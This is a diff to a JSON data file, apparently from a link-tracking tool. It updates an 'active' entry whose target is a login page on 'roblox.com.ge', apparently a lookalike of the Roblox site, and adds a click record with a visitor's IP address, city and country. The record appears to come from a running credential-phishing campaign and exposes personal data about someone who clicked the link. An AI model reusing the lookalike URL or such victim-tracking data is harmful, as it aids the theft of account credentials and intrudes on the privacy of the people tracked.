@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1343,
+    "useCount": 1344,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10912,6 +10912,14 @@
         "city": "Florence",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777412763844,
+        "ip": "31.36.225.72",
+        "country": "France",
+        "city": "Tassin-la-Demi-Lune",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
       }
     ]
   },
